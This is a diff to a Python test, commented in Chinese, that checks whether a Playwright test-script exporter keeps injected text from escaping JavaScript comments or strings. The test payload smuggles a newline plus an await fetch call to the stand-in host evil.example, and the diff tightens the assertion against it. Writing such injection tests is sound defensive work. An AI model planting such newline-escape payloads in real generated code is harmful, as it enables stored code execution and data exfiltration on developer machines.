@@ -181,12 +181,15 @@ def main():
     # 运行；若含换行则可逃出 // 行注释，把注入代码变成 live 语句（存储型注入 → 开发机执行）。
     MARK = "http://evil.example/EXFIL"
     payload = f"点登录\nawait fetch('{MARK}'); //"
+    # payload 换行后的可执行片段：换行若未被消除，它会另起一行成为 live 代码。
+    _live_head = payload.split("\n", 1)[1].strip()  # await fetch('...'); //
 
     def _no_live_injection(text: str):
-        # 含 MARK 的每一行都必须是注释（strip 后以 // 开头）；否则说明逃逸成 live 代码。
+        # 真正的危险是注入代码单独成行被执行。MARK 落在 // 注释（_js_comment 去换行）或
+        # 单引号字符串字面量（_js_str 去换行 + 转义 ' → \\'，如 test('<title>') / 断言文本）里都安全——
+        # 它始终与前文同行。故校验：没有任何一行以该可执行片段开头（换行注入未逃逸成 live 代码）。
         for ln in text.splitlines():
-            if MARK in ln:
-                assert ln.strip().startswith("//"), f"注入逃逸成 live 代码: {ln!r}"
+            assert not ln.strip().startswith(_live_head), f"注入逃逸成 live 代码: {ln!r}"
 
     # desc 注入
     _no_live_injection(export_case_to_playwright(
